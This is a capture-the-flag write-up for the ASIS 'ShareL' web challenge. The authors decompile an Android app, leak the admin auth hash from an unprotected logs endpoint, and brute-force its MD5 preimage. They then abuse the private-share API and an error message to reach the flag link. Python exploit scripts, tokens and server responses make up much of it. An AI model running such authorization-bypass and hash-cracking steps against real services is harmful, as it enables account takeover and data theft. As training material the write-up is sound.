# ShareL (Web, 357p, 7 solved)

In the challenge we get [an Android app](shareL.txz) to work with.

Once we decompile it we can pinpoin some useful pieces of code:

```java
public interface APIInterFace {
    @GET("api/link/mylinks")
    @Headers({"Content-Type:application/json"})
    Call<MyLinks> MyLinks(@Header("auth-token") String str, @Header("device-id") String str2);

    @GET("api/link/preview/{user_id}/{rnd_num}/{link_name}")
    @Headers({"Content-Type:application/json"})
    Call<PreviewLink> PreviewLink(@Header("auth-token") String str, @Header("device-id") String str2, @Path("user_id") int i, @Path("rnd_num") int i2, @Path("link_name") String str3);

    @GET("api/user/{user_id}/public_links")
    @Headers({"Content-Type:application/json"})
    Call<UsrPLink> UserPubLink(@Header("auth-token") String str, @Header("device-id") String str2, @Path("user_id") int i);

    @GET("api/users/{user_id}")
    @Headers({"Content-Type:application/json"})
    Call<UserProfile> getUserProfile(@Header("auth-token") String str, @Header("device-id") String str2, @Path("user_id") int i);

    @GET("api/users/register/{md}/{rnd}")
    Call<NewDevice> regNewDev(@Path("md") String str, @Path("rnd") String str2);

    @POST("api/links/share")
    @Headers({"Content-Type:application/json"})
    Call<ShareLink> shareLink(@Header("auth-token") String str, @Header("device-id") String str2, @Body sShareLink ssharelink);

    @POST("api/links/share/private")
    @Headers({"Content-Type:application/json"})
    Call<SharePLinkUser> sharePLink(@Header("auth-token") String str, @Header("device-id") String str2, @Body sSharePLink sshareplink);

    @GET("api/users/top")
    @Headers({"Content-Type:application/json"})
    Call<Top10Users> top10user(@Header("auth-token") String str, @Header("device-id") String str2);

    @GET("api/users/me")
    @Headers({"Content-Type:application/json"})
    Call<Whoami> whoami(@Header("auth-token") String str, @Header("device-id") String str2);
}
```

This is the definition of the backend API, at least most of it.
In `AllUsersLogActivity` we can find two additional endpoints, including very important `/logs/all/log_id/`.

Another vital part is:

```java
public class Utils {
    public static String BASE_URL = "http://66.172.33.148:5001";

    public static void setBaseUrl(String str) {
        BASE_URL = str;
    }

    public static String getAuth(Context context) {
        SharedPreferences sharedPreferences = context.getSharedPreferences("register", 0);
        String string = sharedPreferences.getString("auth", null);
        int i = sharedPreferences.getInt("uid", 1000);
        StringBuilder sb = new StringBuilder();
        sb.append(i);
        sb.append(".");
        sb.append(string);
        return sb.toString();
    }

    public static String getUid(Context context) {
        int i = context.getSharedPreferences("register", 0).getInt("uid", 1000);
        StringBuilder sb = new StringBuilder();
        sb.append(i);
        sb.append("");
        return sb.toString();
    }

    public static String getDeviceId(Context context) {
        return CryptoHandler.md5(Secure.getString(context.getContentResolver(), "android_id"));
    }

    public static boolean isEmulator() {
        String str = "generic";
        if (!Build.FINGERPRINT.startsWith(str) && !Build.FINGERPRINT.startsWith(EnvironmentCompat.MEDIA_UNKNOWN)) {
            String str2 = "google_sdk";
            if (!Build.MODEL.contains(str2) && !Build.MODEL.contains("Emulator") && !Build.MODEL.contains("Android SDK built for x86") && !Build.MANUFACTURER.contains("Genymotion") && ((!Build.BRAND.startsWith(str) || !Build.DEVICE.startsWith(str)) && !str2.equals(Build.PRODUCT))) {
                return false;
            }
        }
        return true;
    }

    public static int getRandom() {
        if (isEmulator()) {
            return new Random().nextInt(14) + 1;
        }
        return new Random().nextInt(900000000) + 100000000;
    }
}
```

From this we know the URL for the application backend, and we know how `getAuth`, `getUid` and `getRandom` are called.
Finally in order to start playing, we need to know how to register, since most endpoints require `@Header("device-id") String str2, @Path("user_id") int i`.

This we can find in `SplashScreen.java`:

```java
public void registerNewDevice() {
        Call call;
        APIInterFace aPIInterFace = (APIInterFace) new APIClient(getApplicationContext()).getClient().create(APIInterFace.class);
        this.state.setText("Registering New Device ...\n");
        final String string = Secure.getString(getContentResolver(), "android_id");
        this.random = Utils.getRandom();
        CryptoHandler.getPhonId(string);
        String str = "";
        if (new RootBeer(getApplicationContext()).isRooted()) {
            String sha1Hash = CryptoHandler.sha1Hash(string);
            this.random = new Random().nextInt(859) + 1;
            StringBuilder sb = new StringBuilder();
            sb.append(this.random);
            sb.append(str);
            call = aPIInterFace.regNewDev(sb.toString(), sha1Hash);
        } else {
            String md5 = CryptoHandler.md5(string);
            this.random = new Random().nextInt(900000000) + 100000000;
            StringBuilder sb2 = new StringBuilder();
            sb2.append(this.random);
            sb2.append(str);
            call = aPIInterFace.regNewDev(md5, sb2.toString());
        }
        final SharedPreferences sharedPreferences = getSharedPreferences("register", 0);
        call.enqueue(new Callback<NewDevice>() {
            public void onResponse(Call<NewDevice> call, Response<NewDevice> response) {
                String str = "uid";
                NewDevice newDevice = (NewDevice) response.body();
                try {
                    if (newDevice.code == 200) {
                        Editor edit = SplashScreen.this.getSharedPreferences("register", 0).edit();
                        edit.putString("auth", newDevice.data.auth_hash);
                        edit.putString("phone_id", string);
                        edit.putInt(str, newDevice.data.user_id);
                        edit.putInt("rnd", SplashScreen.this.random);
                        edit.apply();
                        Intent intent = new Intent(SplashScreen.this.getApplicationContext(), MainActivity.class);
                        intent.putExtra(str, sharedPreferences.getInt(str, 0));
                        intent.addFlags(268468224);
                        SplashScreen.this.startActivity(intent);
                        return;
                    }
                    SplashScreen.this.state.setText("the app cannot register, sorry ...\n");
                    Context applicationContext = SplashScreen.this.getApplicationContext();
                    StringBuilder sb = new StringBuilder();
                    sb.append("code:  ");
                    sb.append(newDevice.code);
                    Toast.makeText(applicationContext, sb.toString(), 1).show();
                } catch (Exception e) {
                    e.printStackTrace();
                    Toast.makeText(SplashScreen.this.getApplicationContext(), "Failed", 0).show();
                }
            }

            public void onFailure(Call<NewDevice> call, Throwable th) {
                Toast.makeText(SplashScreen.this.getApplicationContext(), "Failed", 0).show();
            }
        });
    }
```

In the end it's pretty simple, we just need to send request to `@GET("api/users/register/{md}/{rnd}")` with `md` being `md5` of our `androidID` (we can use any string here) and `rnd` being number from `new Random().nextInt(900000000) + 100000000;`:

```python
    md5 = hashlib.md5("p4_xakep").hexdigest()
    rnd = random.randint(100000000, 1000000000)
    link = "http://66.172.33.148:5001/api/users/register/" + md5 + "/" + str(rnd)
    r = requests.get(link)
    print(r.text)
```

Once we do this, we get back user ID and authentication hash:

```json
{"code":200,"data":{"auth_hash":"def8e3a5de492f1a5ba8c8f239560246","user_id":7}}
```

What is important to notice here, is that our `auth_hash` is in fact `md5(rnd)`, in this case `md5('460528284')`.
This will come in handy later on.
I have no idea how we were supposed to guess it, we were just lucky...

The `device id`, as we can see from the source code, is `md5` we provided when registering.

Now that we're logged in, it's time to poke around the API.
First thing we notice is that some endpoints don't really validate the headers they seemingly require.

But let's start with the really interesting endpoint, the one that was hidden from the retrofit API client, the `logs`:

```python
for i in range(1, 50):
    url = "http://66.172.33.148:5001/logs/all/log_id/" + str(i)
    r = requests.get(url, headers={"auth-token": "1234.def8e3a5de492f1a5ba8c8f239560246", "device-id": "not really verified"})
    print(r.text)
```

From that we can get back:

```
{"code":200,"data":{"logs":{"log_details":"user_id(1) created by auth_hash(7974d396f5cfcdbe3433037c11e819ca)","log_id":23,"log_name":"application log","user_id":1}}}

{"code":200,"data":{"logs":{"log_details":"user_id(1) changed the users.register.activity.logs = 1","log_id":24,"log_name":"application log","user_id":1}}}

{"code":200,"data":{"logs":{"log_details":"","log_id":25,"log_name":"application log","user_id":1}}}

{"code":200,"data":{"logs":{"log_details":"","log_id":26,"log_name":"application log","user_id":1}}}

{"code":200,"data":{"logs":{"log_details":"","log_id":27,"log_name":"application log","user_id":1}}}

{"code":200,"data":{"logs":{"log_details":"user_id(1) shared a private link named test","log_id":28,"log_name":"application log","user_id":1}}}

{"code":200,"data":{"logs":{"log_details":"user_id(1) changed the links.share.activity.log = 0","log_id":29,"log_name":"application log","user_id":1}}}
```

Rest of the logs is not really important.

From this we can see:

1. Admin auth hash (!) `7974d396f5cfcdbe3433037c11e819ca`
2. Message admin shared -> `shared a private link named test`

As mentioned before, some of the endpoints don't verify `device-id`, so just with auth token from admin we can look around some endpoints.

From the logs is seems admin added some note, but redacted this in the logs.
Most likely this is the flag!

Initially we thought that this link `test` is the flag, so we tried to share it with our registered user.

But it seems that the payload we send is:

```java
public class sSharePLink {
    public String link_name;
    public int random_number;
    public int share_user_id;
    public int user_id;
}
```

It includes the random number admin used when registering.
However, as mentioned earlier, we noticed that this `md5(this number)` is actually the auth token.
This means we can just do:

```python
import hashlib
from multiprocessing import freeze_support

from crypto_commons.brute.brute import brute
from crypto_commons.generic import long_range


def worker(data):
    start, stop = data
    for i in long_range(start, stop):
        if hashlib.md5(str(i)).hexdigest() == '7974d396f5cfcdbe3433037c11e819ca':
            print(i)


def main():
    part_size = 900000000 / 6
    brute(worker, [(i * part_size, (i + 1) * part_size) for i in range(6)], processes=6)


if __name__ == '__main__':
    freeze_support()
    main()
```

And recover this in a moment.
This gives us `493291123`.

Now we can share the link `test` with our user:

```python
    url = "http://66.172.33.148:5001/api/links/share/private"
    r = requests.post(url, json={"link_name": "test", "random_number": "493291123", "user_id": "1", "share_user_id": "7"},
                      headers={
                          "auth-token": "1234.7974d396f5cfcdbe3433037c11e819ca",
                          "device-id": "not really verified",
                          "Content-Type": "application/json"
                      })
    print(r.text)
```

And we get back:

```json
{"code":200,"data":{"msg":"the user_id(7) can view the link by /api/link/preview/1/493291123/test"}}
```

And indeed, we can now check this link, but it's not the flag.

If we check stats for the admin:

```python
url = "http://66.172.33.148:5001/api/users/me"
r = requests.get(url, headers={"auth-token": "1234.7974d396f5cfcdbe3433037c11e819ca", "device-id": "1234"})
print(r.text)
```

We ca see:

```json
{"code":200,"data":{"links":5,"user_id":1,"user_type":"Administrator"}}
```

So admin has 5 links.

It took us a long time to figure out how to get the name of the admin links (trying to get device-id, to use `/mylinks` was a no-go, the android_id is unpredictable).
Eventually we played a little bit with adding our own links and sharing them, and then we noticed that trying to add the same link twice gives us and error with list of all the names of our links!

We can do this now for the admin, because we know there is a link `test`:

```python
url = "http://66.172.33.148:5001/api/links/share"
r = requests.post(url, json={"link_name": "test", "link": "https://somelink", "private": "0"},
                  headers={
                      "auth-token": "1234.7974d396f5cfcdbe3433037c11e819ca",
                      "device-id": "not really verified",
                      "Content-Type": "application/json"
                  })
print(r.text)
```

And we get:

```json
{"code":400,"data":{"err":"you cannot pick the link name which has already exists ['test', 'google', 'thefl4g_Not3', 'a', 'local']"}}
```

Now we have the name `thefl4g_Not3` and we can share it with our user:

```python
    url = "http://66.172.33.148:5001/api/links/share/private"
    r = requests.post(url, json={"link_name": "thefl4g_Not3", "random_number": "493291123", "user_id": "1", "share_user_id": "7"},
                      headers={
                          "auth-token": "1234.7974d396f5cfcdbe3433037c11e819ca",
                          "device-id": "not really verified",
                          "Content-Type": "application/json"
                      })
    print(r.text)
```

And we have:

```json
{"code":200,"data":{"msg":"the user_id(7) can view the link by /api/link/preview/1/493291123/thefl4g_Not3"}}
```

And finally we can view the flag link: 

```python
url = "http://66.172.33.148:5001//api/link/preview/1/493291123/thefl4g_Not3"
r = requests.get(url, headers={"auth-token": "1234.def8e3a5de492f1a5ba8c8f239560246", "device-id": "2ef73a3388eb415c5a415b8004bae2b9"})
print(r.text)
```

And there is:

```json
{"code":200,"data":{"link":"https://ShareL.tld/fL/r34d_me"}}
```

And we go to the `http://66.172.33.148:5001/fL/r34d_me` for the flag `flag":"ASIS{34f9266d60f7eb45a8f29796e44853eb}`
